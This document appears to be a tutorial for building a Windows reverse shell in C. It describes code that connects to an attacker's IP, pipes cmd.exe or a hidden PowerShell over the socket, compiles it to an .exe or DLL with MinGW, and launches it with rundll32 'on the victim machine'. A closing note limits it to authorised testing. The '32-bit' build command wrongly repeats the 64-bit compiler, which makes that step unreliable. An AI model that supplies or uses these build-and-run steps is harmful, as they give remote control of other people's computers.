# Reverse Shell C Code Tutorial for Windows

This guide demonstrates how to create a reverse shell in C on Windows using Winsock2, compile it, and optionally wrap it into a DLL that can be executed remotely.

## **Code Walkthrough**

The attached c code `reverse.c` creates a reverse shell that connects to a specified IP and port and then runs a command shell (`cmd.exe`) remotely over the network.

### **Code Explanation**
### **Key Components**

1. **Socket Initialization**
   - The code starts by initializing Winsock using `WSAStartup()`.
   
2. **Server Setup**
   - The `sockaddr_in` structure is configured to set up the connection parameters such as IP address and port.
   
3. **Establish Connection**
   - The `connect()` function establishes a connection to the target IP and port.

4. **Redirect Input/Output**
   - The `STARTUPINFO` structure is used to redirect standard input, output, and error streams to the socket.
   
5. **Process Creation**
   - `CreateProcessA()` is used to spawn the `cmd.exe` shell on the victim machine, which will interact with the attacker via the socket.

### **Alternative for PowerShell Reverse Shell**

You can replace `"cmd"` with `"powershell"` to launch PowerShell as a reverse shell instead of `cmd.exe`:

```c
CreateProcessA(NULL, "powershell", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
```

---

## **Compile the C File to .exe**

You can compile the C file to a Windows executable using MinGW.

### **For 32-bit Windows Target:**

```bash
x86_64-w64-mingw32-gcc -o output.exe source.c -lws2_32
```

### **For 64-bit Windows Target:**

```bash
x86_64-w64-mingw32-gcc -o output.exe source.c -lws2_32
```

The `-lws2_32` flag links the **Winsock2** library, which is required for network-related APIs.

---

## **Compile the C File to .dll**

You can also compile the code into a DLL to be executed with `rundll32`.
Use the c code called `reverse_to_dll.c` 
To compile the code into a DLL, use:

```bash
x86_64-w64-mingw32-gcc -o reverse.dll reverse_to_dll.c -lws2_32 -shared
```

---

## **Export Function from DLL**

You can inspect the exported functions of the DLL using the `pefile` Python module.

### **Using `pefile` to List DLL Exports:**

```bash
python -m pefile exports reverse.dll
```

This will output a list of exported functions from the DLL, like:

```bash
0x3a8c11541 b'Function_name' 1
```

---

## **Test the DLL File Manually**

To test the DLL manually from the victim machine, use the following command:

```bash
rundll32 reverse.dll,Function_name
```

This will invoke the function `Function_name()` inside the `reverse.dll` and execute the reverse shell.

---

## **Conclusion**

This guide demonstrated how to create a reverse shell in C, compile it into a Windows executable or DLL, and run it remotely. The core of this process involves setting up a socket connection and redirecting input/output to that socket. You can adapt this method to other tasks, such as creating a remote command execution tool or experimenting with PowerShell.

---

### **Important Note**

This code should be used in a legal and ethical context only, such as in penetration testing environments where you have permission to test security vulnerabilities.
